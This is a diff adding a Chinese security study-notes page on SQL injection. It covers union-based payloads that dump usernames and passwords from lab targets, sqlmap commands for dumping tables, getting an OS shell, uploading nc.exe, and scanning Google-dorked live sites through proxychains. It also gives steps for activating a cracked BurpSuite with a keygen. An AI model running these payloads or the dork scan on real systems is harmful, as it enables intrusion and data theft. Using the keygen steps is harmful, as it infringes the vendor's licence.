+<h4 id="4、Mysql跨库注入"><a href="#4、Mysql跨库注入" class="headerlink" title="4、Mysql跨库注入"></a>4、Mysql跨库注入</h4><p>跨库注入是指攻击者可以通过注入攻击代码来执行对其他数据库的操作。攻击者可以使用这种技术来获取或修改其他数据库的数据，包括敏感信息的泄露、恶意代码的执行、修改或删除数据等。跨库注入首先需要明确注入点的权限，若不是root权限或者管理员权限，那么无法执行跨库注入，只有高权限才能执行跨库注入。</p>
+<p>简单来说，跨库注入就是在同一个数据库管理系统中，在某一个点存在SQL注入，而通过这点查询到，该权限为 root 权限，那么就可以使用这种方式去操作同数据库下的其它网站数据库，这样就实现的跨库注入。</p>
+<h4 id="5、Mysql文件读写————————"><a href="#5、Mysql文件读写————————" class="headerlink" title="5、Mysql文件读写————————-"></a>5、Mysql文件读写————————-</h4><p>MySQL读写文件方法大致有这几个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file()、load data infile()、into outfile、into dumpfile</span><br></pre></td></tr></table></figure>
+
+<p>进行文件读写需要满足的条件：</p>
+<ul>
+<li><code>secure_file_priv</code> 值允许对该路径下的文件进行操作。（查看方法：<code>show variables like &#39;secure_file_priv&#39;;</code>）</li>
+<li><code>secure_file_priv</code> 的值说明：<ul>
+<li>值为NULL，表示禁止文件的导入与导出</li>
+<li>值为某一目录，表示只能对该目录下的文件导入与导出</li>
+<li>值为空，表示不对文件的读写进行限制</li>
+</ul>
+</li>
+<li>数据库用户对文件有读权限</li>
+<li>知道文件的完整路径</li>
+<li>文件大小小于 <code>max_allowed_packet</code>（ <code>load_file()</code> 函数受到这个值的限制）（查看方法：<code>show global variables like &#39;max_allowed%&#39;;</code>）</li>
+</ul>
+<p>在mysql 5.6.34版本以后 <code>secure_file_priv</code> 的值默认为NULL。可以通过以下方式修改：</p>
+<ul>
+<li>在windows中，修改 <code>mysql.ini</code> 文件，在 <code>[mysqld]</code> 下添加条目：<code>secure_file_priv =</code></li>
+<li>在Linux中在 <code>/etc/my.cnf</code> 的 <code>[mysqld]</code> 下面添加 <code>secure_file_priv = &#39;&#39;</code> 选项</li>
+</ul>
+<p>1）文件读取函数</p>
+<p><code>load_file()</code>除了读取本地文件，同样也支持网络路径</p>
+<p>1.1、sql注入分类</p>
+<p>sql注入可以分为数字型、字符型、搜索型、特殊闭合型、布尔盲注、时间盲注、报错注入等</p>
+<p>1.2、sql注入流程</p>
+<p>寻找注入点—＞判断闭合方式—＞验证—＞判断列数及回显位—＞取数据</p>
+<p>1.3、寻找注入点</p>
+<p>一般来讲，在网站中，注入点都存在于可以与数据库交互的地方，如搜索框，登录输入框、更新、查询、删除等</p>
+<p>那么我们找到了可能存在注入点的地方，就需要进行测试，这里采用手工测试的方式，帮助各位靓仔们更好的理解。</p>
+<p>1.4、注入提交方式</p>
+<p>常见的注入提交有：GET提交、POST提交、COOKIE提交</p>
+<p>GET提交：写在url地址栏里</p>
+<p>POST提交：（url地址栏中看不到参数）（bp抓包语句写在报文里，前面没有“？”）（分块传输可能会绕过waf）</p>
+<p>cookie提交：（bp抓包 语句写在报文里）</p>
+<p>http头（忽略不计）</p>
+<p>1.5、万能密码</p>
+<p><code>&#39;or 1＝1</code> 其原理是使用单引号对前面的语句进行闭合，这样后面的语句就会被当作正常的sql语句解析，而or为或运算符，即使前面的字符不为真，语句也可以正常执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,email from member where id=5 order by 2;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">show databases;</span><br><span class="line">use xxx;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,3-- -</span><br><span class="line">0&#x27; union select 1,database(),3-- -</span><br><span class="line">0&#x27; union select 1,database(),user()-- -</span><br><span class="line">0&#x27; union select 1,database(),(group_concat(id,&#x27; &#x27;,username,&#x27; &#x27;,password)) from security.users-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.29</span><br><span class="line">192.168.0.37</span><br><span class="line">&#x27; or &#x27;&#x27;=&#x27;</span><br><span class="line">1&#x27; union select 1,2,3-- -</span><br><span class="line">0&#x27; union select 1,database(),3-- -爆库</span><br><span class="line">0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -爆表</span><br><span class="line">0&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()-- -爆字段</span><br><span class="line">0&#x27; union select 1,group_concat(id,username,password),3 from security.users-- -爆字段</span><br><span class="line"></span><br><span class="line">0&#x27; union select 1,(group_concat(id,&#x27; &#x27;,username,&#x27; &#x27;,password)) from security.users-- -</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SQLMAP详解"><a href="#SQLMAP详解" class="headerlink" title="SQLMAP详解"></a>SQLMAP详解</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/t102526/article/details/129357031">sqlmap工具说明-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/131236510">SQLmap使用教程图文教程（超详细）-CSDN博客</a></p>
+<h3 id="SQLmap是什么？"><a href="#SQLmap是什么？" class="headerlink" title="SQLmap是什么？"></a>SQLmap是什么？</h3><p>SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL和SQL注入漏洞，其广泛的功能和选项包括数据库指纹，枚举，数据库提权，访问目标文件系统，并在获取操作权限时执行任意命令。</p>
+<p>SQLMAP是开源的自动化SQL注入工具，由Python写成。</p>
+<h3 id="SQLmap安装"><a href="#SQLmap安装" class="headerlink" title="SQLmap安装"></a>SQLmap安装</h3><p>windows系统：需要先下载python安装，然后再下载sqlmap进行安装和使用。Sqlmap项目存储在github上。使用sqlmap之前必须安装python，并添加环境变量，如： <code>E:\python\python37</code> 。</p>
+<p>kali系统：自带sqlmap工具</p>
+<h3 id="SQLMAP目录介绍"><a href="#SQLMAP目录介绍" class="headerlink" title="SQLMAP目录介绍"></a>SQLMAP目录介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">doc目录：			保护sqlmap的简要说明，具体使用说明，作者信息等。</span><br><span class="line">extra目录：		包含sqlmap的额外功能，如发出声响、允许cmd、安全执行等。</span><br><span class="line">lib目录：			sqlmap核心目录。</span><br><span class="line">plugins目录：		包含了sqlmap目前支持的13种数据库信息和数据库通用事项。</span><br><span class="line">procs目录：		包含了mssql、mysql、oracle、postgresql的触发程序。</span><br><span class="line">shell目录：		包含了注入成功后的9种shell远程命令执行。</span><br><span class="line">tamper目录：		包含了waf绕过脚本。</span><br><span class="line">thirdparty目录：	包含了第三方插件，例如优化，保持连接，颜色。</span><br><span class="line">txt目录：			包含了表名字典，列名字典，UA字典等。</span><br><span class="line">udf目录：			存放攻击载荷。</span><br><span class="line">waf目录：			存放waf特征判断脚本。</span><br><span class="line">xml目录：			存放多种数据库注入检测的payload等信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP特性"><a href="#SQLMAP特性" class="headerlink" title="SQLMAP特性"></a>SQLMAP特性</h3><p><strong>sqlmap支持常见的六种不同的注入模式（不计算其他数据库类型）：</strong></p>
+<p>1、基于布尔盲注，即可以根据返回页面判断条件真假的注入。</p>
+<p>2、基于时间盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
+<p>3、基于报错注入、即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>4、联合查询注入、可以使用union的情况下的注入。</p>
+<p>5、堆查询注入、可以同时执行多条语句的执行时的注入。</p>
+<p>6、内联查询注入、在sql语句中执行sql语句</p>
+<p><strong>SQLMAP支持的13+种数据库</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali系统</span><br><span class="line">/user/share/sqlmap/plugins/dbms</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP基本命令"><a href="#SQLMAP基本命令" class="headerlink" title="SQLMAP基本命令"></a>SQLMAP基本命令</h3><p>1、选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -h				sqlmap --help				显示基本帮助信息并退出</span><br><span class="line">sqlmap -hh				显示高级帮助信息并退出</span><br><span class="line">sqlmap --version		sqlmap -version				显示程序版本信息并退出</span><br></pre></td></tr></table></figure>
+
+<p>2.目标</p>
+<blockquote>
+<p>在这些选项中必须提供至少有一个确定目标</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-u		目标URL  </span><br><span class="line">-m		后接一个txt文件，文件中是多个url，sqlmap会自动化的检测其中的所有url。</span><br><span class="line">-r		可以将一个post请求方式的数据包(bp抓包)保存在一个txt中，sqlmap会通过post方式检测目标。</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>例：<code>sqlmap -u &quot;www.abc.com/index.php?id=1&quot;</code></li>
+<li>例：<code>sqlmap -m target.txt</code></li>
+<li>例：<code>sqlmap -r bp.txt</code></li>
+</ul>
+</blockquote>
+<p>3.请求</p>
+<blockquote>
+<p>这些选项可以用来指定如何连接到目标URL</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--method=METHOD		指定是get方法还是post方法。</span><br><span class="line">例： --method=GET --method=POST</span><br><span class="line">--random-agent		使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在sqlmap/txt/user-agent.txt 在level&gt;=3时会检测user-agent注入。</span><br><span class="line">--proxy=PROXY		指定一个代理。</span><br><span class="line">例： --proxy=&quot;127.0.0.1:8080&quot; 使用GoAgent代理</span><br></pre></td></tr></table></figure>
+
+<p>4.注入</p>
+<blockquote>
+<p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p					测试参数</span><br><span class="line">例：  sqlmap -r bp.txt -p &quot;username&quot;</span><br><span class="line">--skip-static		跳过测试静态参数(有的时候注入有多个参数，那么有些无关紧要的参数修改后页面是没有变化的)</span><br><span class="line">--no-cast			获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。(这个在我们注入失败的时候偶尔会见到，提示尝试使用--no-cast)</span><br><span class="line">--tamper=TAMPER		使用sqlmap自带的tamper，或者自己写的tamper，来混淆payload，通常用来绕过waf和ips。</span><br></pre></td></tr></table></figure>
+
+<p>5.检测</p>
+<blockquote>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL		执行测试的等级（1-5，默认为1） </span><br><span class="line">lv2：cookie; lv3：user-agent，refere; lv5：host </span><br><span class="line">在sqlmap/xml/payloads文件内可以看见各个level发送的payload  我常使用--level 3</span><br><span class="line">--risk=RISK			执行测试的风险（0-3，默认为1） </span><br><span class="line">risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试</span><br><span class="line">升高风险等级会增加数据被篡改的风险。  常用就是默认1</span><br></pre></td></tr></table></figure>
+
+<p>6.枚举</p>
+<blockquote>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。 脱库时使用</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-b, --banner			获取数据库管理系统的标识</span><br><span class="line">--current-user			获取数据库管理系统当前用户</span><br><span class="line">--current-db			获取数据库管理系统当前数据库</span><br><span class="line">--hostname				获取数据库服务器的主机名称</span><br><span class="line">--is-dba				检测DBMS当前用户是否DBA</span><br><span class="line">--users					枚举数据库管理系统用户</span><br><span class="line">--passwords				枚举数据库管理系统用户密码哈希</span><br><span class="line">--privileges			枚举数据库管理系统用户的权限</span><br><span class="line">--dbs					枚举数据库管理系统数据库</span><br><span class="line">--tables				枚举DBMS数据库中的表</span><br><span class="line">--columns				枚举DBMS数据库表列</span><br><span class="line">-D						要进行枚举的指定数据库名</span><br><span class="line">-T						要进行枚举的指定表名</span><br><span class="line">-C						要进行枚举的指定列名</span><br><span class="line">--dump					转储数据库表项,查询字段值</span><br><span class="line">--search				搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">--sql-query=QUERY		要执行的SQL语句</span><br><span class="line">--sql-shell				提示交互式SQL的shell</span><br></pre></td></tr></table></figure>
+
+<p>7.文件操作</p>
+<blockquote>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--file-read=RFILE		从后端的数据库管理系统文件系统读取文件</span><br><span class="line">--file-write=WFILE		编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">--file-dest=DFILE		后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>
+
+<p>在kali中将&#x2F;software&#x2F;nc.exe文件上传到C:&#x2F;WINDOWS&#x2F;Temp下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; --file-write=&quot;/software/nc.exe&quot; --file-dest=&quot;C:/WINDOWS/Temp/nc.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>8.操作系统访问</p>
+<blockquote>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=OSCMD      执行操作系统命令（OSCMD）</span><br><span class="line">--os-shell          交互式的操作系统的shell</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">python3 .\sqlmap.my -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch --dbs</span><br><span class="line">kali:</span><br><span class="line">sqlmap -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch --dbs</span><br><span class="line">sqlmap -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch -D &quot;security&quot; --tables</span><br><span class="line">sqlmap -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch -D &quot;security&quot; -T &quot;users&quot; --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch -D &quot;security&quot; -T &quot;users&quot; -C &quot;id,password&quot; --dump</span><br><span class="line"></span><br><span class="line">-g</span><br><span class="line">--is-dba</span><br><span class="line">--batch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/etc/proxychains4.conf</span><br><span class="line">socks4 127.0.0.1 9050    -&gt;    socks5 192.168.10.129 7890</span><br><span class="line"></span><br><span class="line">proxychains4 sqlmap -g &quot;inurl:index.php?id=&quot; --is-dba --batch</span><br></pre></td></tr></table></figure>
+
+<h2 id="中国蚁剑-AntSword-安装、使用教程"><a href="#中国蚁剑-AntSword-安装、使用教程" class="headerlink" title="中国蚁剑(AntSword)安装、使用教程"></a>中国蚁剑(AntSword)安装、使用教程</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/108099952">中国蚁剑(AntSword)安装、使用教程</a></p>
+<p>1、安装</p>
+<blockquote>
+<p>AntSword-Loader-v4.0.3-win32-x64</p>
+</blockquote>
+<p>选择一个空的目录去初始化，那么他会自动去下载源码。</p>
+<p>不过源码已经不在了，会出现以下情况（404）。</p>
+<p>下载的核心源码解压在 <code>AntSword.exe</code> 所在目录。</p>
+<p>点开，扫描核心源码所在的位置。</p>
+<p>2、使用教程</p>
+<p>右键页面空白处，添加数据。</p>
+<h2 id="Yakit"><a href="#Yakit" class="headerlink" title="Yakit"></a>Yakit</h2><p>官网下载：<a target="_blank" rel="noopener" href="https://yaklang.io/">https://yaklang.io</a></p>
+<p>点击 <code>[default]</code></p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/Yakit_2023_11_13_19_48_58_729.png"></p>
+<p>选择 <code>MITM</code> 的 <code>MIM交互式劫持</code> 点击 <code>免配置启动</code> ，进行配置</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/Yakit_2023_11_13_19_49_50_956.png"></p>
+<p>Yakit</p>
+<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><h3 id="BurpSuite-解压安装"><a href="#BurpSuite-解压安装" class="headerlink" title="BurpSuite 解压安装"></a>BurpSuite 解压安装</h3><p>解压该文件 <code>BurpSuite v2.1中文版.zip</code> 。</p>
+<p>解压文件如下：</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_40_53_198.png"></p>
+<p>它里面有对应的jdk，如果没有下载 jdk ，则双击 <code>jdk-8u91-windows-x64.exe</code> 进行安装。</p>
+<p>在当前目录下进入命令提示符cmd窗口，输入如下命令。（可以输入 <code>burp-loader</code> 后，直接 <code>Tab</code> 出来）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar burp-loader-keygen-2.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_00_29_82.png"></p>
+<p>回车后出现如下界面。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_18_27_370.png"></p>
+<p>注意：点击 <code>Run</code> 出现的时英文版。点击当前文件夹下的 <code>Start.vbs</code> 出现的时中文版。（这里我选择的时中文版）</p>
+<blockquote>
+<p>如果会闪屏，把原本的 <code>jdk</code> 换成文件夹下的 <code>jdk</code> 。</p>
+</blockquote>
+<p>这里需要许可证。将上面的 <code>License</code> 复制到里面去。然后点 <code>下一个</code> 。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_07_966.png"></p>
+<p>然后点 <code>手动激活</code> 。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_14_130.png"></p>
+<p>会出下如下界面。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_30_732.png"></p>
+<p>上面点击 <code>复制请求</code> ，粘贴到如下窗口中的 <code>Activation Request</code> 那里去。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_19_56_146.png"></p>
+<p>复制 <code>Activation Response</code> 到 BurpSuite 里面去。点击 <code>下一个</code> 。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_20_22_695.png"></p>
+<p>然后点击 <code>完成</code> 。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_20_28_11.png"></p>
+<p>点击 <code>下一个</code> </p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_20_58_281.png"></p>
+<p>点击 进入<code>Burp</code> 。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_21_02_448.png"></p>
+<p>会出现如下界面</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_21_32_77.png"></p>
+<h3 id="管理证书"><a href="#管理证书" class="headerlink" title="管理证书"></a>管理证书</h3><p>去浏览器输入地址 <code>127.0.0.1:8080</code> 。出现如下界面，点击 <code>CA Certificate</code> 下载证书。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_23_28_992.png"></p>
+<p>到浏览器的 <code>管理证书</code> 里面去。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_24_43_691.png"></p>
+<p>出现如下界面。选择 <code>受信任的根证书颁发机构</code> ，导入证书。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_25_10_460.png"></p>
+<p>然后选择下载到的证书文件 <code>.der</code>。如果看不到，选择文件类型为 <code>所有文件</code>。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_04_775.png"></p>
+<p>点击下一步。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_17_574.png"></p>
+<p>点击下一步。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_20_541.png"></p>
+<p>点击完成。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_23_739.png"></p>
+<p>点击是。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_27_45_236.png"></p>
+<h3 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h3><p>使用 <code>BurpSuite</code> 需要设置代理。打开 <code>SwitchyOmega</code> 的 <code>选项</code>。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_34_37_432.png"></p>
+<p>新建情景模式，命名随便。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_35_02_58.png"></p>
+<p>对新建的情景模式进行编辑。编辑如下：</p>
+<blockquote>
+<p>代理协议：HTTP。代理服务器：127.0.0.1。代理窗口：8080。然后点击 <code>应用选项</code> 。</p>
+</blockquote>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_35_47_491.png"></p>
+<h3 id="BurpSuite的使用"><a href="#BurpSuite的使用" class="headerlink" title="BurpSuite的使用"></a>BurpSuite的使用</h3><h4 id="1、拦截请求"><a href="#1、拦截请求" class="headerlink" title="1、拦截请求"></a>1、拦截请求</h4><p>打开 <code>SwitchyOmega</code> ，选择新建好的情景模式。</p>
+<p>打开 <code>BurpSuite</code> ，进入 <code>代理</code> -&gt; <code>拦截</code> 。显示的是拦截禁用，就是拦截禁用。</p>
+<p>打开百度。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_36_49_76.png"></p>
+<p>在 <code>BurpSuite</code> 里，选择 <code>拦截请求</code> 。然后点击百度页面的随便一个链接。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_37_04_475.png"></p>
+<p>这样就会拦截到请求。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_37_12_127.png"></p>
+<p>点击 <code>放包</code> 就会一步步放开请求。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_10_37_29_125.png"></p>
+<h4 id="2、sql注入"><a href="#2、sql注入" class="headerlink" title="2、sql注入"></a>2、sql注入</h4><p>打开 <code>SwitchyOmega</code> ，选择新建好的情景模式。打开 <code>BurpSuite</code> ，进入 <code>代理</code> -&gt; <code>拦截</code> 。显示的是拦截禁用，就是拦截禁用。</p>
+<p>拦截请求，将拦截到的请求发送到响应器里面，然后拦截禁用，进入到响应器里面。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_40_04_614.png"></p>
+<p>可以在请求里面修改参数，如下所示，然后点击 发送，在右侧就会收到响应数据。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_46_54_103.png"></p>
+<p>然后右击，选择 <code>在浏览器中显示响应</code> 。将复制到的网址粘贴到转入。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_47_55_787.png"></p>
+<p>然后就可以在页面看到sql注入后的数据了。</p>
+<p><img src="/2023/11/22/SQL%E6%B3%A8%E5%85%A5/BurpSuite_2023_11_23_19_48_09_514.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www 文件夹下面</span><br><span class="line">master后面这段给删了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config.inc.php</span><br><span class="line"></span><br><span class="line">DBPW  数据库密码</span><br></pre></td></tr></table></figure>
+
+<p>复制粘贴，保存为 config.inc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/pikachu</span><br></pre></td></tr></table></figure>
+
+<p>初始化安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select (user()),(version())--&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 2</span><br><span class="line">select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2--</span><br><span class="line">1 and 1=1--</span><br><span class="line">1 orber by 3--</span><br><span class="line">1 union select 1,2--</span><br><span class="line">1 union select (user()),(version())--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2 union select (select schema_name from information_schema.schemata limit 2,1),(select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;user&#x27; and column_name=&#x27;authentication_string&#x27; limit 0,1)--+&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
